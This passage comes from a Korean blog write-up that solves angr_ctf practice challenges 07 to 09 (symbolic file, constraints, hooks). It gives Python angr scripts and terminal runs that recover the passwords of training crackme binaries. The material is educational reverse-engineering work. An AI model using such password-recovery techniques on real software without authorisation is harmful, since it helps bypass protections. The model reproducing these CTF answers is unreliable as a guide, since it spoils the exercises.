content=symbolic_file_backing_memory, size=symbolic_file_size_bytes)symbolic_filesystem = {    filename : password_file  }initial_state.posix.fs = symbolic_filesystem</code></pre><p><code>SimSymbolicMemory</code>&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;? &#xC65C;&#xC8E0;???</p><p>&#xC124;&#xBA85;&#xC744; &#xBCF4;&#xBA74; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC740; &#xC2DC;&#xD000;&#xC15C; &#xB370;&#xC774;&#xD130;&#xC758; &#xC2A4;&#xD2B8;&#xB9BC;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xAF2D; &#xD30C;&#xC77C;&#xC77C; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB098; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xACB0;&#xACFC;&#xAC12;&#xC774; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xB2E4;&#xACE0; &#xD558;&#xB294;&#xB370;&#xC694;. &#xC554;&#xD2BC; &#xBB34;&#xC5C7;&#xC778;&#xAC00;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xD574;&#xC8FC;&#xB294; &#xB290;&#xB08C;&#xC778;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xAD6C;&#xC694;. <code>SimFile</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD574;&#xC8FC;&#xACE0; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xACFC; &#xB9E4;&#xD551;&#xC744; &#xC2DC;&#xCF1C;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C;&#xD558;&#xBA74; &#xB05D;&#xC778;&#xAC70; &#xAC19;&#xB124;&#xC694;! &#xADF8;&#xB7FC; &#xB3CC;&#xB824;&#xBD05;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">06</span>_angr_symbolic_dynamic_memory Enter the password: UBDKLMBVUNOERNYSGood Job.j0ker@angr:~/angr_ctf/dist$ python3 scaffold07.py <span class="hljs-number">07</span>_angr_symbolic_file WARNING | 2021-08-15 05:39:36,180 | angr.storage.memory_mixins.bvv_conversion_mixin | Encoding unicode string for memory as utf-8. Did you mean to use a bytestring?Traceback (most recent call last):  File <span class="hljs-string">&quot;scaffold07.py&quot;</span>, line <span class="hljs-number">130</span>, <span class="hljs-keyword">in</span> &lt;module&gt;    main(sys.argv)  File <span class="hljs-string">&quot;scaffold07.py&quot;</span>, line <span class="hljs-number">47</span>, <span class="hljs-keyword">in</span> main    symbolic_file_backing_memory = angr.state_plugins.SimSymbolicMemory()AttributeError: module <span class="hljs-string">&apos;angr.state_plugins&apos;</span> has no attribute <span class="hljs-string">&apos;SimSymbolicMemory&apos;</span></code></pre><p>???????????????????????????????????? &#xC5C6;&#xB2E4;&#xACE0;?????? &#xC65C;&#xC5C6;&#xB294;&#xB370;???????</p><p>&#xD558;&#xC544; &#xC774; &#xB54C;&#xBD80;&#xD130; &#xBA58;&#xD0C8;&#xC774; &#xB098;&#xAC00;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xC774;&#xB7F0; &#xACE0;&#xB09C; &#xC5C6;&#xC774;&#xB3C4; &#xB0B4; &#xC778;&#xC0DD;&#xC740; &#xCDA9;&#xBD84;&#xD788; &#xACE0;&#xD1B5;&#xC2A4;&#xB7EC;&#xC6B4;&#xAC70; &#xAC19;&#xC740;&#xB370;&#x2026;</p><p>&#xC554;&#xD2BC; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xACE0;&#xCE58;&#xAE30; &#xC704;&#xD574; &#xAC80;&#xC0C9;&#xC744; &#xC880; &#xD574;&#xBCF4;&#xB2E4;&#xAC00; &#xC544;&#xB798; &#xAE00;&#xC744; &#xCC3E;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://jasper.la/posts/angr-9-simfile-without-simsymbolicmemory/">Angr 9 SimFile without SimSymbolicMemory</a></p><p>&#xC774; &#xAE00;&#xC744; &#xBCF4;&#xBA74; &#xC774; angr_ctf&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4;&#xC9C0; &#xB9E4;&#xC6B0; &#xC624;&#xB798;&#xB418;&#xC5C8;&#xACE0; angr&#xB3C4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xBA74;&#xC11C; &#xAE30;&#xB2A5;&#xC774; &#xD1B5;&#xD569;&#xB418;&#xACE0; &#xAD6C;&#xC870;&#xD654;&#xB418;&#xBA74;&#xC11C; <code>SimFile</code>&#xC774; &#xC62E;&#xACA8;&#xC84C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xB0A0;&#xB824;&#xC8FC;&#xACE0; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">password_file = angr.SimFile(filename,          content = password,          size = symbolic_file_size_bytes)initial_state = project.factory.blank_state(          addr = start_address,          fs = {filename: password_file})</code></pre><p>&#xC774;&#xB807;&#xAC8C;&#xB9CC; &#xBD10;&#xB3C4; &#xD6E8;&#xC52C;&#xB354; &#xC4F0;&#xAE30; &#xD3B8;&#xD574;&#xC9C4;&#xAC70; &#xAC19;&#xB124;&#xC694;. &#xC77C;&#xB2E8; <code>SimFile</code>&#xC744; &#xD1B5;&#xD574; &#xBC14;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD574;&#xC904; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>black_state</code>&#xC758; <code>fs</code> &#xC778;&#xC790;&#xC5D0; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xACFC; &#xD30C;&#xC77C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB9CC; &#xB9E4;&#xD551;&#xD574;&#xC11C; &#xC804;&#xB2EC;&#xB9CC; &#xD574;&#xC8FC;&#xBA74; &#xB05D;!!!</p><h2 id="sol07-py"><a href="#sol07-py" class="headerlink" title="sol07.py"></a>sol07.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>  project = angr.Project(<span class="hljs-string">&apos;07_angr_symbolic_file&apos;</span>)  start_address = <span class="hljs-number">0x080488D6</span>  filename = <span class="hljs-string">&apos;OJKSQYDP.txt&apos;</span>  symbolic_file_size_bytes = <span class="hljs-number">0x40</span>  password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, symbolic_file_size_bytes * <span class="hljs-number">8</span>)  password_file = angr.SimFile(filename,          content = password,          size = symbolic_file_size_bytes)  initial_state = project.factory.blank_state(          addr = start_address,          fs = {filename: password_file}  )  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> <span class="hljs-string">b&apos;Good Job.&apos;</span> <span class="hljs-keyword">in</span> stdout_output  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> <span class="hljs-string">b&apos;Try again.&apos;</span> <span class="hljs-keyword">in</span> stdout_output  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution = solution_state.solver.eval(password,cast_to=bytes).decode()    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main()</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol07.py <span class="hljs-number">07</span>_angr_symbolic_file WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804893c</span> (main+<span class="hljs-number">0xc2</span> <span class="hljs-keyword">in</span> <span class="hljs-number">07</span>_angr_symbolic_file (<span class="hljs-number">0x804893c</span>))AZOMMMZMj0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">07</span>_angr_symbolic_file Enter the password: AZOMMMZMGood Job.</code></pre><h1 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h1><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xACBD;&#xB85C;&#xC81C;&#xC57D;&#xC870;&#xAC74;&#xC5D0; &#xB300;&#xD55C; &#xBB38;&#xC81C;&#xC77C;&#xB4EF; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xAE4C;&#xBCF4;&#xBA74; &#xADF8;&#xB0E5; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled 2.png" alt="angr_part4/Untitled 2.png"></p><p><code>password</code>&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xACE0; 16&#xBC14;&#xC774;&#xD2B8; &#xC785;&#xB825;&#xAC12;&#xC744; &#xBC1B;&#xC740; &#xB4A4; &#xC785;&#xB825;&#xAC12;&#xACFC; <code>password</code>&#xB97C; &#xC9EC;&#xC9DC;&#xBBF8;&#xD558;&#xC5EC; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xAC19;&#xC740;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC70;&#xACA0;&#xC8E0;. &#xADFC;&#xB370; &#xC5F0;&#xC0B0; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xD568;&#xC218;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB124;&#xC694;. &#xC774; &#xD568;&#xC218;&#xB3C4; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled 3.png" alt="Untitled"></p><p>&#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xB450; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC74; &#xB9DE;&#xC9C0;&#xB9CC; &#xD2C0;&#xB9AC;&#xB294; &#xC989;&#xC2DC; &#xB9AC;&#xD134;&#xD558;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C; &#xBB38;&#xC790; &#xBA87;&#xAC1C;&#xAC00; &#xB9DE;&#xB294;&#xC9C0; &#xC13C;&#xB2E4;&#xC74C; &#xBA87;&#xAC1C;&#xAC00; &#xB9DE;&#xB294;&#xC9C0; 16&#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xB9DE;&#xB294;&#xC9C0;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xB9AC;&#xD134;&#xD558;&#xB124;&#xC694;. angr&#xC5D0;&#xC11C; &#xC774;&#xB7F0; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xBB34;&#xC218;&#xD788; &#xB9CE;&#xC740; state&#xAC00; &#xC0DD;&#xC131;&#xB420;&#xAC8C; &#xBED4;&#xD569;&#xB2C8;&#xB2E4;. &#xC911;&#xAC04;&#xC5D0; &#xBA48;&#xCD9C;&#xC218;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; &#xB9D0;&#xC774;&#xC8E0;. &#xAC70;&#xAE30;&#xC5D0;&#xB2E4;&#xAC00; 16&#xBC14;&#xC774;&#xD2B8;&#xC9DC;&#xB9AC; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xBA74; &#xC5C4;&#xCCAD;&#xB09C; &#xACBD;&#xC6B0;&#xC758; &#xC218;(branch)&#xAC00; &#xC788;&#xC73C;&#xB2C8; &#xC774; &#xD568;&#xC218;&#xB294; &#xC560;&#xCD08;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC548;&#xB420;&#xB4EF; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774; &#xD568;&#xC218;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;&#xC5D0; &#xC5F0;&#xC0B0; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xC6B0;&#xB9AC;&#xAC00; &#xC9C1;&#xC811; &#xBE44;&#xAD50;&#xD558;&#xB294;&#xAC8C; &#xC880; &#xB354; &#xD6A8;&#xC728;&#xC801;&#xC77C;&#xB4EF; &#xC2F6;&#xB124;&#xC694;.</p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; <code>scanf</code> &#xB4A4;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD574;&#xC11C; <code>check_equals_</code> &#xD568;&#xC218;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xD574; &#xB3C4;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>check_equals_</code>&#xD568;&#xC218;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCCB4;&#xD06C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">constrained_parameter_address = <span class="hljs-number">0x0804A050</span>constrained_parameter_size_bytes = <span class="hljs-number">16</span>constrained_parameter_bitvector = solution_state.memory.load(  constrained_parameter_address,  constrained_parameter_size_bytes)constrained_parameter_desired_value = <span class="hljs-string">&apos;AUPDNNPROEZRJWKB&apos;</span>solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)</code></pre><p>&#xC77C;&#xB2E8; &#xC785;&#xB825;&#xAC12;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC8FC;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xACFC; &#xC6B0;&#xB9AC;&#xAC00; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB9DE;&#xC544;&#xC57C;&#xD560; &#xAC12;&#xC774; &#xAC19;&#xC544;&#xC57C;&#xD55C;&#xB2E4;&#xB294; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xB418;&#xBA74; z3&#xC5D0;&#xC11C; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xB3C4;&#xCD9C;&#xD560; &#xB54C; &#xC6B0;&#xB9AC;&#xAC00; &#xC124;&#xC815;&#xD55C; &#xC81C;&#xC57D;&#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xACC4;&#xC0B0;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;! &#xADF8;&#xB7EC;&#xBA74; &#xB05D;!</p><p>&#xC774; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC870;&#xAE08; &#xC758;&#xBB38;&#xC774;&#xC5C8;&#xB358; &#xC810;&#xC740; &#xCC98;&#xC74C;&#xC5D0; &#xC785;&#xB825;&#xAC12;&#xC774; &#xD558;&#xB098;&#xC778; &#xAC83;&#xC744; &#xBCF4;&#xACE0; &#xADF8;&#xB0E5; <code>entry_state</code>&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD588;&#xB294;&#xB370; &#xC548;&#xB418;&#xB354;&#xB77C;&#xACE0;&#xC694;? &#xADF8;&#xB798;&#xC11C; &#xC800;&#xB294; &#xC81C;&#xAC00; &#xBB38;&#xC81C;&#xB97C; &#xC798;&#xBABB;&#xD47C; &#xC904; &#xC54C;&#xC558;&#xB294;&#xB370;, <code>scanf</code> &#xB4A4;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB2C8;&#xAE4C; &#xBB38;&#xC81C;&#xAC00; &#xD480;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xCC98;&#xC74C;&#xC5D0;&#xB294; angr&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD06C;&#xAE30; &#xC774;&#xC0C1;&#xC758; &#xC785;&#xB825;&#xAC12;&#xC744; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB098;? &#xD588;&#xB294;&#xB370;, &#xB2E4;&#xC74C; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xB610; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB429;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xC774;&#xAC8C; &#xBB54;&#xC9C0;&#x2026;</p><h2 id="sol08-py"><a href="#sol08-py" class="headerlink" title="sol08.py"></a>sol08.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048625</span>  initial_state = project.factory.blank_state(addr=start_address)  <span class="hljs-comment"># initial_state = project.factory.entry_state()</span>  password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, <span class="hljs-number">8</span>*<span class="hljs-number">16</span>)  password_address =  <span class="hljs-number">0x0804A050</span>  initial_state.memory.store(password_address, password)  simulation = project.factory.simgr(initial_state)  address_to_check_constraint = <span class="hljs-number">0x08048673</span>  simulation.explore(find=address_to_check_constraint)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    constrained_parameter_address = <span class="hljs-number">0x0804A050</span>    constrained_parameter_size_bytes = <span class="hljs-number">16</span>    constrained_parameter_bitvector = solution_state.memory.load(      constrained_parameter_address,      constrained_parameter_size_bytes    )    constrained_parameter_desired_value = <span class="hljs-string">&apos;AUPDNNPROEZRJWKB&apos;</span>    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)    solution = solution_state.se.eval(password, cast_to=bytes)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol08.py <span class="hljs-number">08</span>_angr_constraints WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048625</span> (main+<span class="hljs-number">0x72</span> <span class="hljs-keyword">in</span> <span class="hljs-number">08</span>_angr_constraints (<span class="hljs-number">0x8048625</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">57</span>,<span class="hljs-number">291</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span>WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">57</span>,<span class="hljs-number">292</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span>CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">57</span>,<span class="hljs-number">310</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-string">b&apos;LGCRCDGJHYUNGUJB&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">08</span>_angr_constraints Enter the password: LGCRCDGJHYUNGUJBGood Job.</code></pre><h1 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h1><p>&#xC81C;&#xBAA9;&#xB9CC; &#xBCF4;&#xBA74; &#xBB54;&#xAC08; &#xD6C4;&#xD0B9;&#xD574;&#xC57C;&#xD558;&#xB294;&#xAC70; &#xAC19;&#xB124;&#xC694;. &#xBB58; &#xD6C4;&#xD0B9;&#xD574;&#xC57C;&#xD560; &#xC9C0; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled 4.png" alt="Untitled"></p><p>&#xBCF4;&#xBA74; &#xC785;&#xB825;&#xC744; &#xB450;&#xBC88; &#xBC1B;&#xB294;&#xB370;, &#xC77C;&#xB2E8; &#xCCAB;&#xBC88;&#xC9F8; &#xBC1B;&#xB294;&#xAC78; &#xC544;&#xAE4C;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB85C; &#xCCB4;&#xD06C;&#xB97C; &#xD558;&#xB124;&#xC694;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD6C4;&#xD0B9;&#xD574;&#xC11C; &#xB6F0;&#xC5B4;&#xB118;&#xC5B4;&#xC57C;&#xD560;&#xB4EF; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xB4A4;&#xC5D0;&#xB294; &#xBB50; &#xADF8;&#xB0E5; &#xBE44;&#xAD50;&#xD558;&#xB294;&#xAC70;&#xB2C8; &#xBCC4;&#xAC70; &#xC5C6;&#xAD6C;&#xC694;. &#xD6C4;&#xD0B9;&#xC740; &#xD574;&#xBCF8;&#xC801;&#xC774; &#xC5C6;&#xC73C;&#xB2C8; &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xD480;&#xC5B4;&#xBCF4;&#xC8E0;!</p><pre><code class="hljs python">check_equals_called_address = <span class="hljs-number">0x080486B3</span>instruction_to_skip_length = <span class="hljs-number">5</span></code></pre><p>&#xC77C;&#xB2E8; &#xC5B4;&#xB514;&#xC11C;&#xBD80;&#xD130; &#xD6C4;&#xD0AC;&#xD560; &#xAC83;&#xC778;&#xC9C0; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xB531; check<em>equals</em> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xBD80;&#xD130; &#xD6C4;&#xD0B9;&#xD558;&#xB3C4;&#xB85D; &#xC8FC;&#xC18C;&#xB97C; 